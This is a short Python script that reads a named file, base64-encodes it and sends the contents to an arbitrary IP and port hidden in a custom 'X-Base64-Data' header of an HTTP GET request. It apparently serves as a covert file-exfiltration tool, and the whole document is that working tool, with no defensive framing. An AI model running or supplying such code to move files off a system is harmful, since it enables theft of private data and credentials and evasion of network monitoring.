import sys
import base64
import http.client

def send_http_request(filepath, ip, port=80):
    headers = {}
    try:
        # Opem file and base64 encode
        with open(filepath, "rb") as f:
            file_content = f.read()
            base64_data = base64.b64encode(file_content).decode("utf-8")

        # Set custom headers
        headers["X-Base64-Data"] = base64_data
        headers["X-FName"] = filepath.split("/")[-1]

        # Create an HTTP connection
        conn = http.client.HTTPConnection(ip, port)

        # Make the HTTP request
        conn.request("GET", "/", headers=headers)

        # Get the response
        response = conn.getresponse()

        # Print the response status and data
        print("Response Status:", response.status)
        print("Response Data:")
        print(response.read().decode("utf-8"))

        # Close
        conn.close()

    except Exception as e:
        print("Error:", str(e))

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python %s <Filepath> <IP> [Port]" % sys.argv[0]);
        sys.exit(1)

    filepath = sys.argv[1]
    ip = sys.argv[2]
    port = int(sys.argv[3]) if len(sys.argv) > 3 else 80

    send_http_request(filepath, ip, port)
